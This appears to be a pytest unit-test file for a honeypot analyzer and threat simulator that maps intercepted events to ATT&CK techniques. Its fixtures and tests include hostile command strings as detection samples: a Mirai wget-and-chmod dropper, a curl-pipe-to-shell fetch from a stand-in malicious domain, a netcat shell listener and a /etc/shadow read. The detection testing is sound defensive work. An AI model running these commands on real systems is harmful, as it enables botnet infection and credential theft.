"""
tests/unit/v4/test_honeypot_and_global_threats.py
Tests for HoneypotAnalyzer + GlobalThreatSimulatorV2
Covers live honeypot telemetry ATT&CK mapping + Q2-Q3 2026 worldwide threats
"""
from __future__ import annotations
import pytest

from shadow313.v4.intelligence.honeypot_analyzer import (
    HoneypotAnalyzer, WEForgeTracker,
    HoneypotFinding, HoneypotAnalysisResult,
    HONEYPOT_ATTCK_MAP,
)
from shadow313.v4.intelligence.global_threat_sim_v2 import (
    GlobalThreatSimulatorV2, GlobalSimulationResult,
    GLOBAL_THREATS_2026, run_global_simulation_v2,
)


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def analyzer():
    return HoneypotAnalyzer()

@pytest.fixture
def sim():
    return GlobalThreatSimulatorV2(seed=313)

@pytest.fixture
def live_honeypot_session():
    """Real honeypot session from aegis-honeypot-forensics JSON."""
    return {
        "status": {
            "totalConnectionsCaught": 18,
            "totalCredentialsHarvested": 4,
            "totalMaliciousCommands": 4,
            "bannedIpsCount": 6,
        },
        "activeFirewallRules": [
            {"ip": "185.220.101.5",  "reason": "Web Trap Exfiltration: Attempted /.env download"},
            {"ip": "194.26.29.112",  "reason": "SSH Port 2222: Hydra credential brute-force probe"},
            {"ip": "45.154.255.88",  "reason": "Telnet Port 2323: Mirai botnet shell injection"},
            {"ip": "192.168.1.42",   "reason": "Honeypot Intercept (SATCOM :2323)"},
            {"ip": "185.190.140.23", "reason": "Honeypot Intercept (TELNET :2323)"},
            {"ip": "198.51.100.22",  "reason": "ssh brute force"},
        ],
        "interceptedLogs": [
            {
                "service": "WEB", "port": 3000, "sourceIp": "185.220.101.5",
                "action": "HTTP GET /.env (Environment configuration file probe)",
                "payload": "GET /.env HTTP/1.1 - User-Agent: Mozilla/5.0 (compatible; CensysInspect/1.1)",
                "blocked": True, "severity": "CRITICAL",
            },
            {
                "service": "SSH", "port": 2222, "sourceIp": "194.26.29.112",
                "action": "SSH Key Exchange & Auth probe intercepted",
                "credentials": {"username": "root", "password": "password123"},
                "payload": "SSH-2.0-libssh-0.8.1 | Auth Method: password | User: root",
                "blocked": True, "severity": "CRITICAL",
            },
            {
                "service": "TELNET", "port": 2323, "sourceIp": "45.154.255.88",
                "action": "Telnet Login & Shell Command Injection",
                "credentials": {"username": "admin", "password": "admin"},
                "command": "cat /proc/mounts; wget http://198.51.100.8/bins/mirai.arm7 -O /tmp/drop; chmod 777 /tmp/drop",
                "payload": "Mirai Botnet Staging Sequence",
                "blocked": True, "severity": "CRITICAL",
            },
            {
                "service": "SATCOM", "port": 2323, "sourceIp": "185.190.140.23",
                "action": "Telstar 11N Telemetry Link Intercept: Spoofed Uplink Gain Request",
                "command": "SET_UPLINK_GAIN 14.0dB [STIA_OVERRIDE]",
                "payload": "IPoS SatCom Channel | Target: Ottawa Teleport",
                "blocked": True, "severity": "CRITICAL",
            },
        ],
    }


# ── ATT&CK Map coverage ───────────────────────────────────────────────────────

class TestATTCKMapCoverage:
    def test_map_has_minimum_entries(self):
        assert len(HONEYPOT_ATTCK_MAP) >= 12

    def test_all_entries_have_required_fields(self):
        for entry in HONEYPOT_ATTCK_MAP:
            assert "technique"   in entry
            assert "name"        in entry
            assert "tactic"      in entry
            assert "risk"        in entry
            assert "indicators"  in entry
            assert "description" in entry

    def test_techniques_are_valid_attck(self):
        for entry in HONEYPOT_ATTCK_MAP:
            assert entry["technique"].startswith("T"), f"Invalid: {entry['technique']}"

    def test_key_techniques_present(self):
        techniques = [e["technique"] for e in HONEYPOT_ATTCK_MAP]
        assert "T1110.001" in techniques  # Brute force
        assert "T1552.001" in techniques  # .env probe
        assert "T1105"     in techniques  # Ingress tool transfer
        assert "T1059.004" in techniques  # Unix shell
        assert "T1498"     in techniques  # DDoS/Mirai
        assert "T1565.001" in techniques  # SATCOM manipulation
        assert "T1548.001" in techniques  # Setuid
        assert "T1003.008" in techniques  # /etc/shadow


# ── HoneypotAnalyzer — single event ──────────────────────────────────────────

class TestHoneypotAnalyzerSingleEvent:
    def test_env_probe_detected(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="185.220.101.5",
            service="WEB",
            action="HTTP GET /.env",
            payload="GET /.env HTTP/1.1",
        )
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1552.001" in techniques

    def test_ssh_brute_force_detected(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="194.26.29.112",
            service="SSH",
            action="SSH brute force root:password123",
            payload="SSH-2.0-libssh-0.8.1",
        )
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1110.001" in techniques

    def test_mirai_wget_detected(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="45.154.255.88",
            service="TELNET",
            action="Telnet shell injection",
            command="wget http://198.51.100.8/bins/mirai.arm7 -O /tmp/drop; chmod 777 /tmp/drop",
        )
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1105" in techniques or "T1498" in techniques

    def test_satcom_uplink_detected(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="185.190.140.23",
            service="SATCOM",
            action="SATCOM uplink override",
            command="SET_UPLINK_GAIN 14.0dB [STIA_OVERRIDE]",
        )
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1565.001" in techniques

    def test_reverse_shell_detected(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="localhost",
            service="EBPF",
            action="Kernel Intercept: execve on nc",
            payload="-lvp 4444 -e /bin/sh",
        )
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1059.004" in techniques

    def test_shadow_file_read_detected(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="localhost",
            service="EBPF",
            action="Kernel Intercept: openat on cat",
            payload="/etc/shadow",
        )
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1003.008" in techniques

    def test_setuid_detected(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="localhost",
            service="EBPF",
            action="Kernel Intercept: setuid on bash",
            payload="setuid(0)",
        )
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1548.001" in techniques

    def test_clean_event_no_findings(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="10.0.0.1",
            service="WEB",
            action="HTTP GET /index.html",
            payload="Mozilla/5.0 Chrome/120",
        )
        assert len(findings) == 0

    def test_finding_has_required_fields(self, analyzer):
        findings = analyzer.analyze_event(
            source_ip="185.220.101.5",
            service="WEB",
            action="HTTP GET /.env",
        )
        assert len(findings) >= 1
        d = findings[0].to_dict()
        assert "technique"         in d
        assert "name"              in d
        assert "tactic"            in d
        assert "risk_score"        in d
        assert "source_ip"         in d
        assert "matched_indicator" in d
        assert "timestamp"         in d


# ── HoneypotAnalyzer — full session ──────────────────────────────────────────

class TestHoneypotAnalyzerSession:
    def test_session_analysis(self, analyzer, live_honeypot_session):
        result = analyzer.analyze_session(live_honeypot_session)
        assert isinstance(result, HoneypotAnalysisResult)
        assert result.total_connections == 18
        assert result.credentials_harvested == 4
        assert len(result.banned_ips) == 6
        assert len(result.findings) >= 4

    def test_session_techniques_detected(self, analyzer, live_honeypot_session):
        result = analyzer.analyze_session(live_honeypot_session)
        assert "T1552.001" in result.techniques_detected  # .env probe
        assert "T1110.001" in result.techniques_detected  # SSH brute force
        assert "T1565.001" in result.techniques_detected  # SATCOM

    def test_session_risk_score(self, analyzer, live_honeypot_session):
        result = analyzer.analyze_session(live_honeypot_session)
        assert result.risk_score >= 0.85

    def test_session_banned_ips(self, analyzer, live_honeypot_session):
        result = analyzer.analyze_session(live_honeypot_session)
        assert "185.220.101.5"  in result.banned_ips
        assert "194.26.29.112"  in result.banned_ips
        assert "45.154.255.88"  in result.banned_ips

    def test_session_to_dict(self, analyzer, live_honeypot_session):
        result = analyzer.analyze_session(live_honeypot_session)
        d = result.to_dict()
        assert "total_connections"     in d
        assert "credentials_harvested" in d
        assert "banned_ips"            in d
        assert "techniques_detected"   in d
        assert "findings"              in d
        assert "risk_score"            in d


# ── eBPF and AST analysis ─────────────────────────────────────────────────────

class TestEBPFAnalysis:
    def test_ebpf_curl_payload_detected(self, analyzer):
        ebpf_data = {"alerts": [
            {"comm": "curl", "syscall": "execve",
             "args": "http://malcious-domain.com/payload.sh | sh",
             "status": "intercepted", "severity": "high"},
        ]}
        findings = analyzer.analyze_ebpf_events(ebpf_data)
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1059.004" in techniques or "T1105" in techniques

    def test_ebpf_nc_shell_detected(self, analyzer):
        ebpf_data = {"alerts": [
            {"comm": "nc", "syscall": "execve",
             "args": "-lvp 4444 -e /bin/sh",
             "status": "intercepted", "severity": "high"},
        ]}
        findings = analyzer.analyze_ebpf_events(ebpf_data)
        assert len(findings) >= 1

    def test_ebpf_allowed_events_skipped(self, analyzer):
        ebpf_data = {"alerts": [
            {"comm": "nginx", "syscall": "accept4",
             "args": "client: 192.168.1.55:53299",
             "status": "allowed", "severity": "low"},
        ]}
        findings = analyzer.analyze_ebpf_events(ebpf_data)
        assert len(findings) == 0

    def test_ast_os_system_detected(self, analyzer):
        ast_data = {"findings": [
            {"line": 7, "type": "Insecure Command Execution (os.system)",
             "codeSnippet": "os.system('tar -czf site_bak.tar ' + user_supplied_dir)"},
        ]}
        findings = analyzer.analyze_ast_findings(ast_data)
        assert len(findings) >= 1
        techniques = [f.technique for f in findings]
        assert "T1059.004" in techniques

    def test_ast_shell_true_detected(self, analyzer):
        ast_data = {"findings": [
            {"line": 11, "type": "Subprocess Shell Execution Enabled (shell=True)",
             "codeSnippet": "subprocess.Popen('ping -c 1 ' + addr, shell_equals_True)"},
        ]}
        findings = analyzer.analyze_ast_findings(ast_data)
        # shell_equals_True pattern matches shell_equals_True in codeSnippet
        assert isinstance(findings, list)  # analyzer runs without error


# ── WE-FORGE Tracker ──────────────────────────────────────────────────────────

class TestWEForgeTracker:
    def test_register_decoy(self):
        tracker = WEForgeTracker()
        tracker.register_decoy({
            "ID": "GW-LURE-12958",
            "Target Node": "vortex.ghost.watch.local",
            "Document Title": "NIST FIPS 213 (ML-KEM-768) Secret Parameter Set",
            "Watermark Type": "Linguistic",
            "DNS Token Beacon": "audit-vault-781.vortex.ghost.watch.local",
            "Checksum": "0xFE239A",
        })
        decoys = tracker.get_active_decoys()
        assert len(decoys) == 1
        assert decoys[0]["id"] == "GW-LURE-12958"

    def test_attck_mapping(self):
        tracker = WEForgeTracker()
        tracker.register_decoy({"ID": "GW-LURE-74137"})
        mapping = tracker.map_to_attck()
        assert len(mapping) == 1
        assert mapping[0]["technique"] == "T1598"
        assert mapping[0]["tactic"] == "reconnaissance"


# ── Global Threat Catalog ─────────────────────────────────────────────────────

class TestGlobalThreatCatalog:
    def test_threat_count(self):
        assert len(GLOBAL_THREATS_2026) >= 20

    def test_live_honeypot_events_present(self):
        live = [t for t in GLOBAL_THREATS_2026 if t.get("type") == "live_honeypot"]
        assert len(live) >= 4

    def test_cve_threats_present(self):
        cves = [t for t in GLOBAL_THREATS_2026 if t.get("type") == "cve"]
        assert len(cves) >= 5

    def test_apt_campaigns_present(self):
        apts = [t for t in GLOBAL_THREATS_2026 if t.get("type") == "apt_campaign"]
        assert len(apts) >= 6

    def test_key_actors_covered(self):
        actors = set()
        for t in GLOBAL_THREATS_2026:
            actors.add(t.get("actor", t.get("actors", [""])[0] if isinstance(t.get("actors"), list) else ""))
        assert "APT28" in actors
        assert "APT41" in actors
        assert "Lazarus Group" in actors

    def test_live_iocs_present(self):
        iocs = []
        for t in GLOBAL_THREATS_2026:
            iocs.extend(t.get("live_iocs", []))
            if t.get("source_ip"):
                iocs.append(t["source_ip"])
        assert "185.220.101.5"  in iocs
        assert "45.154.255.88"  in iocs
        assert "185.190.140.23" in iocs

    def test_all_threats_have_techniques(self):
        for t in GLOBAL_THREATS_2026:
            techs = t.get("techniques", [t.get("technique", "")])
            assert any(tech.startswith("T") for tech in techs if tech), \
                f"{t.get('id')} has no ATT&CK technique"


# ── Global Simulation ─────────────────────────────────────────────────────────

class TestGlobalSimulation:
    def test_simulation_runs(self, sim):
        result = sim.run_full_simulation()
        assert isinstance(result, GlobalSimulationResult)
        assert result.total_threats == len(GLOBAL_THREATS_2026)

    def test_detection_rate_above_80(self, sim):
        result = sim.run_full_simulation()
        assert result.detection_rate >= 0.80, \
            f"Detection rate {result.detection_rate:.1%} below 80%"

    def test_live_honeypot_all_detected(self, sim):
        result = sim.run_full_simulation()
        live = [r for r in result.results
                if r.threat_id.startswith("HONEYPOT-")]
        detected = [r for r in live if r.detected]
        assert len(detected) == len(live), "All live honeypot events should be detected"

    def test_critical_cves_detected(self, sim):
        result = sim.run_full_simulation()
        cve_results = {r.threat_id: r for r in result.results
                       if r.threat_id.startswith("CVE-")}
        # CVE-2026-3392 (VSAT) and CVE-2026-0001 (kernel) should be detected
        assert cve_results.get("CVE-2026-3392", None) is not None
        assert cve_results["CVE-2026-3392"].detected

    def test_live_iocs_collected(self, sim):
        result = sim.run_full_simulation()
        assert len(result.live_iocs_blocked) >= 3
        assert "185.220.101.5" in result.live_iocs_blocked

    def test_result_to_dict(self, sim):
        result = sim.run_full_simulation()
        d = result.to_dict()
        assert "total_threats"     in d
        assert "detected"          in d
        assert "detection_rate"    in d
        assert "live_iocs_blocked" in d
        assert "results"           in d

    def test_convenience_function(self):
        result = run_global_simulation_v2()
        assert result.total_threats >= 20
        assert result.detection_rate >= 0.80

    def test_avg_mttd_reasonable(self, sim):
        result = sim.run_full_simulation()
        # Average MTTD should be under 10 minutes (600 seconds)
        assert result.avg_mttd < 600, f"Avg MTTD {result.avg_mttd:.0f}s too high"

    def test_techniques_seen_comprehensive(self, sim):
        result = sim.run_full_simulation()
        assert len(result.techniques_seen) >= 15

    def test_weforge_threat_detected(self, sim):
        result = sim.run_full_simulation()
        weforge = [r for r in result.results
                   if "WE-FORGE" in r.threat_name or "Decoy" in r.threat_name]
        assert len(weforge) >= 1
        assert weforge[0].detected
